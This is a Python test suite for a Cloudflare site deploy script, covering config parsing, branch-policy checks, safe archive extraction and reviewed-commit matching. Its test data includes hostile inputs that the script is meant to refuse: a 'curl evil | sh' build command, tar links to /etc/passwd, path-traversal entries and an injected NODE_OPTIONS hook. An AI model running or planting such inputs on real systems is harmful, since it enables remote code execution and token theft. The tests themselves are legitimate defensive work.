import io
import itertools
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import unittest
import urllib.error
from collections.abc import Callable, Mapping
from email.message import Message
from pathlib import Path
from typing import Any
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
import deploy

PRODUCTION: dict[str, Any] = {"name": "ejmlabs-cli", "routes": [{"pattern": "cli.ejmlabs.com", "custom_domain": True}], "assets": {"directory": "./dist"}}
STAGING: dict[str, Any] = {"name": "ejmlabs-cli-staging", "routes": [{"pattern": "cli-staging.ejmlabs.com", "custom_domain": True}], "assets": {"directory": "./dist"}}
CONFIG = json.dumps({**PRODUCTION, "env": {"staging": STAGING}}, indent=2) + "\n"
PROTECTED: dict[str, Any] = {"deployment_branch_policy": {"protected_branches": False, "custom_branch_policies": True}, "protection_rules": []}
ONLY_MAIN: dict[str, Any] = {"total_count": 1, "branch_policies": [{"id": 1, "name": "main", "type": "branch"}]}


class JsoncTests(unittest.TestCase):
    def test_comments_and_trailing_commas_are_removed(self) -> None:
        text = '{\n    // the site\n    "$schema": "https://unpkg.com/wrangler/config-schema.json",\n    "routes": [{ "pattern": "a.ejmlabs.com", },],\n}\n'
        self.assertEqual(deploy.site_config(text), {"$schema": "https://unpkg.com/wrangler/config-schema.json", "routes": [{"pattern": "a.ejmlabs.com"}]})

    def test_line_comments_after_a_value_and_at_the_end_are_removed(self) -> None:
        self.assertEqual(deploy.site_config('{"a": 1, // trailing note\n "b": 2} // no final newline'), {"a": 1, "b": 2})
        self.assertEqual(deploy.site_config('{"a": 1}\r\n// last line'), {"a": 1})

    def test_block_comments_are_removed_across_lines_and_between_tokens(self) -> None:
        self.assertEqual(deploy.site_config('/* header\n   over lines */ {"a": /* inline */ 1, /* x */ "b": [1, /* y */ 2]}'), {"a": 1, "b": [1, 2]})
        self.assertEqual(deploy.site_config('{"a":1/**/,"b":2}'), {"a": 1, "b": 2})

    def test_comment_markers_inside_strings_are_kept(self) -> None:
        text = '{"url": "https://ejmlabs.com/a//b", "note": "/* not a comment */", "path": "C://x", "q": "say \\"//\\" now", "s": "back\\\\" // real comment\n}'
        self.assertEqual(deploy.site_config(text), {"url": "https://ejmlabs.com/a//b", "note": "/* not a comment */", "path": "C://x", "q": 'say "//" now', "s": "back\\"})

    def test_trailing_commas_are_removed_only_outside_strings(self) -> None:
        self.assertEqual(deploy.site_config('{"a": [1, 2,\n  ],\n  "b": {"c": 3,\n},\n}'), {"a": [1, 2], "b": {"c": 3}})
        self.assertEqual(deploy.site_config('{"a": [1, // one\n 2, /* two */\n], }'), {"a": [1, 2]})
        self.assertEqual(deploy.site_config('{"x": ",}", "y": ", ]", "z": "a,\\n}"}'), {"x": ",}", "y": ", ]", "z": "a,\n}"})
        self.assertEqual(deploy.site_config('{"a": [1, 2], "b": [3]}'), {"a": [1, 2], "b": [3]})

    def test_a_comma_that_separates_values_is_never_dropped(self) -> None:
        with self.assertRaises(ValueError):
            deploy.site_config('{"a": 1,, "b": 2}')
        with self.assertRaises(ValueError):
            deploy.site_config('{"a": 1 "b": 2}')

    def test_a_byte_order_mark_is_accepted(self) -> None:
        self.assertEqual(deploy.site_config('\ufeff{"a": 1}'), {"a": 1})

    def test_unterminated_strings_comments_and_non_objects_are_refused(self) -> None:
        for text in ('{"a": "open', '{"a": 1} /* open', '{"a": "x\\', "[]", "1", '"text"', ""):
            with self.subTest(text=text), self.assertRaises(ValueError):
                deploy.site_config(text)


class ConfigTests(unittest.TestCase):
    def test_production_deploys_the_top_level_config(self) -> None:
        self.assertEqual(deploy.check(PRODUCTION, "production"), [])

    def test_staging_needs_its_own_worker_and_routes(self) -> None:
        self.assertEqual(deploy.check({**PRODUCTION, "env": {"staging": STAGING}}, "staging"), ["--env", "staging"])
        for staging in (None, {**STAGING, "routes": []}, {**STAGING, "routes": PRODUCTION["routes"]}, {**STAGING, "name": PRODUCTION["name"]},
                        {key: value for key, value in STAGING.items() if key != "name"}):
            with self.subTest(staging=staging), self.assertRaisesRegex(ValueError, "Staging needs"):
                deploy.check({**PRODUCTION, "env": {} if staging is None else {"staging": staging}}, "staging")
        with self.assertRaisesRegex(ValueError, "Staging needs"):
            deploy.check({**PRODUCTION, "env": None}, "staging")

    def test_no_build_command_runs_beside_the_token(self) -> None:
        for config in ({**PRODUCTION, "build": {"command": "npm run build"}}, {**PRODUCTION, "env": {"staging": {**STAGING, "build": {"command": "x"}}}}):
            for environment in deploy.ENVIRONMENTS:
                with self.subTest(config=config, environment=environment), self.assertRaisesRegex(ValueError, "build command"):
                    deploy.check(config, environment)
        with self.assertRaisesRegex(ValueError, "Unknown deploy environment"):
            deploy.check(PRODUCTION, "preview")

    def test_every_site_packs_its_config_and_its_source_path_holds_it(self) -> None:
        for profile, (_, config, files) in deploy.SITES.items():
            with self.subTest(profile=profile):
                self.assertTrue(any(config == path or config.startswith(path + "/") for path in files))
                self.assertIn(deploy.source_path(profile), files)
                self.assertTrue(config == deploy.source_path(profile) or config.startswith(deploy.source_path(profile) + "/"))
        # Only ejm-ide supplies Worker source: its whole distribution directory is committed and reviewed.
        self.assertEqual({profile: deploy.source_path(profile) for profile in deploy.SITES if deploy.source_path(profile) != deploy.SITES[profile][1]}, {"ejm-ide": "distribution"})

    def paths(self, config: dict[str, Any], profile: str = "ejm-cli") -> None:
        _, config_path, files = deploy.SITES[profile]
        deploy.check_paths(config, config_path, deploy.source_path(profile), files)

    def test_assets_must_stay_inside_the_declared_output(self) -> None:
        self.paths(PRODUCTION)
        self.paths({**PRODUCTION, "env": {"staging": STAGING}})
        for directory in ("../../..", "/etc", "../src", "./", "..", "dist/../../x", "", 3, "C:\\dist"):
            for config in ({**PRODUCTION, "assets": {"directory": directory}}, {**PRODUCTION, "env": {"staging": {**STAGING, "assets": {"directory": directory}}}}):
                with self.subTest(directory=directory), self.assertRaises(ValueError):
                    self.paths(config)

    def test_a_worker_main_must_be_committed_source_under_the_source_path(self) -> None:
        self.paths({**PRODUCTION, "assets": {"directory": "../website/dist"}, "main": "worker.js"}, "ejm-ide")
        self.paths({"main": "./src/worker.ts", "assets": {"directory": "../website/dist"}}, "ejm-ide")
        for main in ("../website/dist/worker.js", "../../x.js", "/opt/x.js", "..", ".", "", None):
            with self.subTest(main=main), self.assertRaises(ValueError):
                self.paths({"main": main}, "ejm-ide")
        # In ejm-ide a staging override cannot point elsewhere either.
        with self.assertRaisesRegex(ValueError, "committed source"):
            self.paths({"env": {"staging": {"main": "../website/dist/w.js"}}}, "ejm-ide")
        # Sites whose source is only the config file have no Worker source to take from the reviewed commit.
        with self.assertRaisesRegex(ValueError, "committed source"):
            self.paths({**PRODUCTION, "main": "worker.js"})

    def test_a_config_for_another_account_is_refused(self) -> None:
        self.paths({**PRODUCTION, "account_id": deploy.ACCOUNT_ID})
        with self.assertRaisesRegex(ValueError, "different Cloudflare account"):
            self.paths({**PRODUCTION, "account_id": "0" * 32})


class EnvironmentTests(unittest.TestCase):
    def check(self, environment: str, found: Any, listing: Any) -> list[str]:
        calls: list[str] = []

        def read(path: str) -> Any:
            calls.append(path)
            return listing if "deployment-branch-policies" in path else found

        with patch.object(deploy, "github", read):
            deploy.check_environment(environment)
        return calls

    def test_main_only_custom_policy_passes_and_a_reviewer_is_never_required(self) -> None:
        self.assertEqual(self.check("staging", PROTECTED, ONLY_MAIN), [
            "/environments/staging", "/environments/staging/deployment-branch-policies?per_page=100"])
        reviewers = {"type": "required_reviewers", "reviewers": [{"type": "User"}]}
        for rules in (None, [], [{"type": "wait_timer", "wait_timer": 5}], [{"type": "required_reviewers", "reviewers": []}], [reviewers]):
            for environment in deploy.ENVIRONMENTS:
                with self.subTest(environment=environment, rules=rules):
                    self.assertEqual(len(self.check(environment, {**PROTECTED, "protection_rules": rules}, ONLY_MAIN)), 2)

    def test_every_other_branch_policy_is_refused(self) -> None:
        def policy(**changes: Any) -> dict[str, Any]:
            return {"deployment_branch_policy": {"protected_branches": False, "custom_branch_policies": True, **changes}}
        bad_environments: dict[str, Any] = {
            "no policy": {"deployment_branch_policy": None},
            "missing policy": {},
            "protected branches": policy(protected_branches=True, custom_branch_policies=False),
            "both flags": policy(protected_branches=True),
            "no custom policies": policy(custom_branch_policies=False),
            "not an object": [],
        }
        for (name, found), environment in itertools.product(bad_environments.items(), deploy.ENVIRONMENTS):
            with self.subTest(name, environment=environment), self.assertRaisesRegex(ValueError, "custom deployment branch policy"):
                self.check(environment, found, ONLY_MAIN)
        main = {"id": 1, "name": "main", "type": "branch"}
        bad_listings: dict[str, Any] = {
            "empty": {"total_count": 0, "branch_policies": []},
            "two": {"total_count": 2, "branch_policies": [main, {"id": 2, "name": "release/*", "type": "branch"}]},
            "other branch": {"total_count": 1, "branch_policies": [{**main, "name": "release"}]},
            "pattern": {"total_count": 1, "branch_policies": [{**main, "name": "ma*"}]},
            "a tag named main": {"total_count": 1, "branch_policies": [{**main, "type": "tag"}]},
            "no type": {"total_count": 1, "branch_policies": [{"id": 1, "name": "main"}]},
            "more than one page": {"total_count": 3, "branch_policies": [main]},
            "no list": {"total_count": 1},
            "not an object": [main],
            "entry not an object": {"total_count": 1, "branch_policies": ["main"]},
        }
        for (name, listing), environment in itertools.product(bad_listings.items(), deploy.ENVIRONMENTS):
            with self.subTest(name, environment=environment), self.assertRaisesRegex(ValueError, "main branch only"):
                self.check(environment, PROTECTED, listing)

    def test_an_api_failure_fails_closed(self) -> None:
        for error in (urllib.error.HTTPError("https://api.github.com/x", 404, "Not Found", Message(), None), urllib.error.URLError("offline"), TimeoutError(), ValueError("bad json")):
            with self.subTest(error=type(error).__name__), patch.object(deploy, "github", side_effect=error), self.assertRaises(type(error)):
                deploy.check_environment("production")
        with self.assertRaisesRegex(ValueError, "Unknown deploy environment"):
            deploy.check_environment("preview")

    def test_the_reader_is_bounded_authenticated_and_fixed_to_the_repository(self) -> None:
        with patch.dict(os.environ, {"GITHUB_REPOSITORY": "ejmlabs/ejm-cli", "GH_TOKEN": "test-token-not-used"}), patch("urllib.request.urlopen") as opened:
            opened.return_value.__enter__.return_value = io.BytesIO(b'{"name": "staging"}')
            self.assertEqual(deploy.github("/environments/staging"), {"name": "staging"})
            request, timeout = opened.call_args.args[0], opened.call_args.kwargs["timeout"]
            self.assertEqual(request.full_url, "https://api.github.com/repos/ejmlabs/ejm-cli/environments/staging")
            self.assertEqual(request.get_header("Authorization"), "Bearer test-token-not-used")
            self.assertEqual(timeout, 30)
            opened.return_value.__enter__.return_value = io.BytesIO(b" " * (deploy.MAX_API_BYTES + 1))
            with self.assertRaisesRegex(ValueError, "byte limit"):
                deploy.github("/environments/staging")
            opened.return_value.__enter__.return_value = io.BytesIO(b"not json")
            with self.assertRaises(ValueError):
                deploy.github("/environments/staging")


def member(name: str, kind: bytes = tarfile.REGTYPE, data: bytes = b"", link: str = "") -> tuple[tarfile.TarInfo, bytes]:
    info = tarfile.TarInfo(name)
    info.type, info.linkname, info.size = kind, link, len(data) if kind == tarfile.REGTYPE else 0
    return info, data


def pack(members: list[tuple[tarfile.TarInfo, bytes]]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as archive:
        for info, data in members:
            archive.addfile(info, io.BytesIO(data) if info.type == tarfile.REGTYPE else None)
    return buffer.getvalue()


class ArchiveTests(unittest.TestCase):
    PATHS = ("site/wrangler.jsonc", "site/dist")

    def checked(self, members: list[tuple[tarfile.TarInfo, bytes]]) -> list[str]:
        with tarfile.open(fileobj=io.BytesIO(pack(members)), mode="r:") as archive:
            return [item.name for item in deploy.checked_members(archive, self.PATHS)]

    def test_regular_files_and_directories_under_the_declared_paths_pass(self) -> None:
        names = self.checked([member("site/wrangler.jsonc", data=b"{}"), member("site/dist", tarfile.DIRTYPE), member("site/dist/index.html", data=b"<html>"),
                              member("site/dist/a/b.css", data=b"x")])
        self.assertEqual(names, ["site/wrangler.jsonc", "site/dist", "site/dist/index.html", "site/dist/a/b.css"])

    def test_links_devices_and_pipes_are_refused(self) -> None:
        for kind in (tarfile.SYMTYPE, tarfile.LNKTYPE, tarfile.CHRTYPE, tarfile.BLKTYPE, tarfile.FIFOTYPE):
            with self.subTest(kind=kind), self.assertRaisesRegex(ValueError, "regular files and directories"):
                self.checked([member("site/dist/x", kind, link="/etc/passwd")])

    def test_absolute_and_parent_paths_are_refused(self) -> None:
        for name in ("/site/dist/x", "../site/dist/x", "site/dist/../../x", "site/dist/../../../etc/x", "site/dist/..", "/"):
            with self.subTest(name=name), self.assertRaises(ValueError):
                self.checked([member(name, data=b"x")])

    def test_paths_outside_the_declared_ones_are_refused(self) -> None:
        for name in ("site/package.json", "site/dist2/x", "site/wrangler.jsonc.bak", "other/dist/x", "site", ".env"):
            with self.subTest(name=name), self.assertRaisesRegex(ValueError, "outside this site's declared paths"):
                self.checked([member(name, data=b"x")])

    def test_member_and_byte_limits_apply(self) -> None:
        members = [member(f"site/dist/{number}", data=b"x") for number in range(3)]
        with patch.object(deploy, "MAX_MEMBERS", 2), self.assertRaisesRegex(ValueError, "limit"):
            self.checked(members)
        with patch.object(deploy, "MAX_ARCHIVE_BYTES", 2), self.assertRaisesRegex(ValueError, "limit"):
            self.checked(members)


class SourceTests(unittest.TestCase):
    def setUp(self) -> None:
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.root = Path(self.directory.name)

    def write(self, name: str, text: str = "x") -> Path:
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
        return path

    def test_a_file_or_a_directory_of_regular_files_is_read_as_bytes(self) -> None:
        self.write("site/wrangler.jsonc", "{}")
        self.write("distribution/wrangler.jsonc", "a")
        self.write("distribution/src/worker.js", "b")
        self.assertEqual(deploy.read_source(self.root, "site/wrangler.jsonc"), {"site/wrangler.jsonc": b"{}"})
        self.assertEqual(deploy.read_source(self.root, "distribution"), {"distribution/wrangler.jsonc": b"a", "distribution/src/worker.js": b"b"})

    def test_missing_linked_and_special_sources_are_refused(self) -> None:
        with self.assertRaisesRegex(ValueError, "Missing or unsafe"):
            deploy.read_source(self.root, "distribution")
        self.write("distribution/a")
        (self.root / "distribution/link").symlink_to(self.root / "distribution/a")
        with self.assertRaisesRegex(ValueError, "links"):
            deploy.read_source(self.root, "distribution")
        (self.root / "distribution/link").unlink()
        (self.root / "distribution/folder").symlink_to(self.root)
        with self.assertRaisesRegex(ValueError, "links"):
            deploy.read_source(self.root, "distribution")
        (self.root / "distribution/folder").unlink()
        os.mkfifo(self.root / "distribution/pipe")
        with self.assertRaisesRegex(ValueError, "regular files"):
            deploy.read_source(self.root, "distribution")
        self.write("single")
        (self.root / "alias").symlink_to(self.root / "single")
        with self.assertRaisesRegex(ValueError, "Missing or unsafe"):
            deploy.read_source(self.root, "alias")

    def test_file_and_byte_limits_apply(self) -> None:
        for number in range(3):
            self.write(f"distribution/{number}")
        with patch.object(deploy, "MAX_SOURCE_FILES", 2), self.assertRaisesRegex(ValueError, "file limit"):
            deploy.read_source(self.root, "distribution")
        with patch.object(deploy, "MAX_SOURCE_BYTES", 2), self.assertRaisesRegex(ValueError, "byte limit"):
            deploy.read_source(self.root, "distribution")

    def test_the_build_must_match_the_reviewed_commit_exactly(self) -> None:
        built, reviewed = self.root / "built", self.root / "reviewed"
        for tree in (built, reviewed):
            for name in ("distribution/wrangler.jsonc", "distribution/worker.js"):
                (tree / name).parent.mkdir(parents=True, exist_ok=True)
                (tree / name).write_text(name)
        deploy.require_reviewed("distribution", built, reviewed)
        (built / "distribution/worker.js").write_text("changed")
        with self.assertRaisesRegex(ValueError, "distribution/worker.js"):
            deploy.require_reviewed("distribution", built, reviewed)
        (built / "distribution/worker.js").write_text("distribution/worker.js")
        (built / "distribution/extra.js").write_text("added by the build")
        with self.assertRaisesRegex(ValueError, "distribution/extra.js"):
            deploy.require_reviewed("distribution", built, reviewed)
        (built / "distribution/extra.js").unlink()
        (reviewed / "distribution/worker.js").unlink()
        with self.assertRaisesRegex(ValueError, "distribution/worker.js"):
            deploy.require_reviewed("distribution", built, reviewed)


class FakeWrangler:
    """A Wrangler stand-in that records how it was started."""

    def __init__(self, temp: Path) -> None:
        self.record = temp / "wrangler-call.json"
        binary = temp / "deployer/node_modules/.bin/wrangler"
        binary.parent.mkdir(parents=True)
        binary.write_text(f"#!{sys.executable}\nimport json, os, sys\nopen({str(self.record)!r}, 'w').write(json.dumps({{'argv': sys.argv[1:], 'env': dict(os.environ), 'cwd': os.getcwd()}}))\n")
        binary.chmod(0o755)

    def call(self) -> dict[str, Any] | None:
        return json.loads(self.record.read_text()) if self.record.exists() else None


class DeployTests(unittest.TestCase):
    """deploy.main end to end with a fake Wrangler and a fake GitHub."""

    def setUp(self) -> None:
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.old_cwd = Path.cwd()
        self.addCleanup(os.chdir, self.old_cwd)
        self.work = Path(self.directory.name, "work")
        self.work.mkdir()
        os.chdir(self.work)
        self.temp = Path(self.directory.name, "temp")
        self.wrangler = FakeWrangler(self.temp)
        self.environment = {"PATH": os.environ["PATH"], "HOME": str(Path(self.directory.name, "home")), "RUNNER_TEMP": str(self.temp), "CI": "true", "PROFILE": "ejm-cli",
                            "CLOUDFLARE_API_TOKEN": "cloudflare-token-not-used", "GH_TOKEN": "github-token-not-used", "GITHUB_TOKEN": "github-token-not-used",
                            "GITHUB_REPOSITORY": "ejmlabs/ejm-cli", "ACTIONS_RUNTIME_TOKEN": "runtime-token-not-used", "NODE_OPTIONS": "--require=./hook.js",
                            "npm_config_userconfig": "/srv/untrusted"}
        patcher = patch.dict(os.environ, self.environment, clear=True)
        patcher.start()
        self.addCleanup(patcher.stop)
        self.reviewed = {"site/wrangler.jsonc": CONFIG}
        self.artifact = {"site/wrangler.jsonc": CONFIG, "site/dist/index.html": "<html>"}
        self.pack()

    def pack(self, *extra: tuple[tarfile.TarInfo, bytes]) -> None:
        """Write artifact/site.tar from self.artifact plus any extra raw members, and the reviewed files."""
        members = [member(name, data=text.encode()) for name, text in self.artifact.items()]
        Path("artifact").mkdir(exist_ok=True)
        Path("artifact/site.tar").write_bytes(pack([*members, *extra]))
        for name, text in self.reviewed.items():
            path = Path("reviewed", name)
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text)

    def fake_api(self, environments: Mapping[str, tuple[Any, Any]] | None = None) -> Callable[[str], Any]:
        known = environments or {"staging": ({**PROTECTED, "protection_rules": []}, ONLY_MAIN), "production": (PROTECTED, ONLY_MAIN)}

        def read(path: str) -> Any:
            name = path.split("/", 3)[2].split("?", 1)[0]
            found, listing = known[name]
            return listing if "deployment-branch-policies" in path else found

        return read

    def test_staging_deploys_the_reviewed_config_with_a_minimal_environment(self) -> None:
        deploy.main(["deploy", "staging"])
        call = self.wrangler.call()
        assert call is not None
        self.assertEqual(call["argv"], ["deploy", "--config", "built/site/wrangler.jsonc", "--env", "staging"])
        # Python itself adds LC_CTYPE to a child that has no locale; the stub is a Python script.
        self.assertEqual(set(call["env"]) - {"LC_CTYPE"}, {"PATH", "HOME", "RUNNER_TEMP", "CI", "CLOUDFLARE_API_TOKEN", "CLOUDFLARE_ACCOUNT_ID", "WRANGLER_SEND_METRICS"})
        self.assertEqual(call["env"]["CLOUDFLARE_ACCOUNT_ID"], deploy.ACCOUNT_ID)
        self.assertEqual(call["env"]["WRANGLER_SEND_METRICS"], "false")
        self.assertEqual(call["env"]["CLOUDFLARE_API_TOKEN"], "cloudflare-token-not-used")
        self.assertEqual(Path("built/site/dist/index.html").read_text(), "<html>")

    def test_production_deploys_the_top_level_config(self) -> None:
        deploy.main(["deploy", "production"])
        call = self.wrangler.call()
        assert call is not None
        self.assertEqual(call["argv"], ["deploy", "--config", "built/site/wrangler.jsonc"])
        self.assertNotIn("GH_TOKEN", call["env"])
        self.assertNotIn("GITHUB_TOKEN", call["env"])

    def test_a_missing_deploy_token_stops_before_wrangler(self) -> None:
        del os.environ["CLOUDFLARE_API_TOKEN"]
        with self.assertRaisesRegex(ValueError, "CLOUDFLARE_API_TOKEN"):
            deploy.main(["deploy", "production"])
        self.assertIsNone(self.wrangler.call())

    def test_a_config_changed_by_the_build_is_refused(self) -> None:
        self.artifact["site/wrangler.jsonc"] = json.dumps({**PRODUCTION, "name": "somewhere-else", "env": {"staging": STAGING}})
        self.pack()
        for environment in deploy.ENVIRONMENTS:
            with self.subTest(environment=environment):
                shutil.rmtree("built", ignore_errors=True)
                with self.assertRaisesRegex(ValueError, "differs from the reviewed commit in: site/wrangler.jsonc"):
                    deploy.main(["deploy", environment])
                self.assertIsNone(self.wrangler.call())

    def test_a_missing_reviewed_config_is_refused(self) -> None:
        Path("reviewed/site/wrangler.jsonc").unlink()
        with self.assertRaisesRegex(ValueError, "Missing or unsafe"):
            deploy.main(["deploy", "production"])
        self.assertIsNone(self.wrangler.call())

    def test_an_unsafe_archive_extracts_nothing_and_runs_nothing(self) -> None:
        bad: dict[str, tuple[tarfile.TarInfo, bytes]] = {
            "symlink": member("site/dist/link", tarfile.SYMTYPE, link="/etc/passwd"),
            "hardlink": member("site/dist/hard", tarfile.LNKTYPE, link="site/wrangler.jsonc"),
            "absolute": member("/srv/evil", data=b"x"),
            "parent": member("site/dist/../../evil", data=b"x"),
            "outside the declared paths": member("site/package.json", data=b"{}"),
            "device": member("site/dist/null", tarfile.CHRTYPE),
        }
        for name, extra in bad.items():
            with self.subTest(name):
                self.pack(extra)
                with self.assertRaisesRegex(ValueError, "Site archive"):
                    deploy.main(["deploy", "staging"])
                self.assertFalse(Path("built").exists())
                self.assertIsNone(self.wrangler.call())

    def test_a_reused_extraction_directory_is_refused(self) -> None:
        Path("built").mkdir()
        with self.assertRaises(FileExistsError):
            deploy.main(["deploy", "staging"])
        self.assertIsNone(self.wrangler.call())

    def test_a_config_that_reaches_outside_its_output_is_refused(self) -> None:
        for name, config in {"assets": {**PRODUCTION, "assets": {"directory": "../../.."}, "env": {"staging": STAGING}},
                             "build": {**PRODUCTION, "build": {"command": "curl evil | sh"}, "env": {"staging": STAGING}},
                             "worker": {**PRODUCTION, "main": "worker.js", "env": {"staging": STAGING}}}.items():
            with self.subTest(name):
                self.artifact["site/wrangler.jsonc"] = self.reviewed["site/wrangler.jsonc"] = json.dumps(config)
                self.pack()
                shutil.rmtree("built", ignore_errors=True)
                with self.assertRaises(ValueError):
                    deploy.main(["deploy", "staging"])
                self.assertIsNone(self.wrangler.call())

    def test_ide_deploys_its_reviewed_worker_and_refuses_a_changed_one(self) -> None:
        os.environ["PROFILE"] = "ejm-ide"
        config = json.dumps({**PRODUCTION, "main": "src/worker.js", "assets": {"directory": "../website/dist"}, "env": {"staging": STAGING}})
        self.reviewed = {"distribution/wrangler.jsonc": config, "distribution/src/worker.js": "export default {}"}
        self.artifact = {**self.reviewed, "website/dist/index.html": "<html>"}
        self.pack()
        deploy.main(["deploy", "staging"])
        call = self.wrangler.call()
        assert call is not None
        self.assertEqual(call["argv"], ["deploy", "--config", "built/distribution/wrangler.jsonc", "--env", "staging"])
        for name, text in (("a changed worker", "export default { fetch: stealToken }"), ("a worker added by the build", None)):
            with self.subTest(name):
                shutil.rmtree("built", ignore_errors=True)
                self.artifact = {**self.reviewed, "website/dist/index.html": "<html>"}
                if text is None:
                    self.artifact["distribution/src/extra.js"] = "x"
                else:
                    self.artifact["distribution/src/worker.js"] = text
                self.pack()
                self.wrangler.record.unlink(missing_ok=True)
                with self.assertRaisesRegex(ValueError, "differs from the reviewed commit"):
                    deploy.main(["deploy", "staging"])
                self.assertIsNone(self.wrangler.call())

    def test_protection_runs_the_environment_check_and_never_wrangler(self) -> None:
        reads = self.fake_api()
        with patch.object(deploy, "github", reads):
            deploy.main(["protection", "staging"])
            deploy.main(["protection", "production"])
        self.assertIsNone(self.wrangler.call())
        broken = self.fake_api({"staging": (PROTECTED, {"total_count": 2, "branch_policies": [{"name": "main", "type": "branch"}, {"name": "dev", "type": "branch"}]}),
                                "production": ({"deployment_branch_policy": None}, ONLY_MAIN)})
        with patch.object(deploy, "github", broken):
            for environment in deploy.ENVIRONMENTS:
                with self.subTest(environment=environment), self.assertRaises(ValueError):
                    deploy.main(["protection", environment])

    def test_the_wrong_arguments_or_repository_are_refused(self) -> None:
        for argv in ([], ["deploy"], ["deploy", "preview"], ["publish", "staging"], ["deploy", "staging", "extra"]):
            with self.subTest(argv=argv), self.assertRaisesRegex(ValueError, "Usage"):
                deploy.main(argv)
        os.environ["PROFILE"] = ".github"
        with self.assertRaisesRegex(ValueError, "No site deploy"):
            deploy.main(["deploy", "staging"])
        self.assertIsNone(self.wrangler.call())

    def test_the_script_reports_a_failure_on_stderr_and_exits_nonzero(self) -> None:
        script = Path(deploy.__file__)
        # Run the real entry point as the workflow does: with -I, no arguments that name a mode.
        result = subprocess.run([sys.executable, "-I", str(script), "deploy", "preview"], capture_output=True, text=True, check=False, env={"PROFILE": "ejm-cli"})
        self.assertEqual(result.returncode, 1)
        self.assertIn("Deploy stopped: ValueError", result.stderr)
        self.assertNotIn("Traceback", result.stderr)


if __name__ == "__main__":
    unittest.main()
